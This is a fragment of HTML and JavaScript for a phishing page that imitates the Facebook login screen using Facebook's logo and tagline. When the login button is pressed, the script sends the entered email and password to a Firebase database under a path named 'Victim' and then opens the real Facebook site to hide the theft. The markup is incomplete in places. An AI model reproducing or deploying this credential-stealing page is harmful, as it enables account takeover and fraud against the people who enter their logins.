<body>
    <div id="main">
        <div id="left">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
            <div>Facebook helps you connect and share with the people in your life.</div>

        <div id="right">

                <input type="text" required id="Email" class="input-box" name="Email"

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBiOeCunm7zhGkXokgMN1K5APwQHBXXRaU",

            projectId: "test2-c04de",
            storageBucket: "test2-c04de.appspot.com",

            appId: "1:516725627457:web:9f1c665de1a96c868e44c0"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);

        //get ref to database services
        const db = getDatabase(app);


        document.getElementById("login").addEventListener('click', function (e) {
            e.preventDefault();
            var a = document.getElementById("Email").value
            var b = a.replace(".", "");
            set(ref(db, 'Victim/' + b),
                {

                    Email: document.getElementById("Email").value,
                    Password: document.getElementById("pass").value,

                });

            window.open('https://www.facebook.com/', '_blank');

        })
    </script>
